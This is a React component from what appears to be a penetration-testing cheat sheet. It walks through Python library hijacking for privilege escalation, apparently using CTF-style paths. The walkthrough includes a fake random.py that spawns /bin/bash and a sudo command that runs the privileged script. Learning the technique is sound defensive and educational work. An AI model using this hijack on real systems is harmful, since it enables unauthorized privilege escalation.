import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const PythonLibraryHijacking = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              If a python program has SUID bit set or elevated privileges and is
              importing a library, we can create our own python script in the
              same directory, with the same name as the library to escalate
              privileges.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Say we have a python script with elevated privileges that imports
              the random library like so:
            </Typography>
            <SyntaxHighlighter className="syntax" language="python">
              {"import random\n" +
                'poem = """The sun was shining on the sea,\n' +
                "Shinging with all his might:\n" +
                "He did his very best to make\n" +
                "..."}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              We can create our own random.py script to hijack the imported
              library.
              <SyntaxHighlighter className="syntax" language="python">
                {"import os\n" + "\n" + 'os.system("/bin/bash")'}
              </SyntaxHighlighter>
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Execute the python script.
              <SyntaxHighlighter className="syntax" language="bash">
                {
                  "sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py"
                }
              </SyntaxHighlighter>
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default PythonLibraryHijacking;
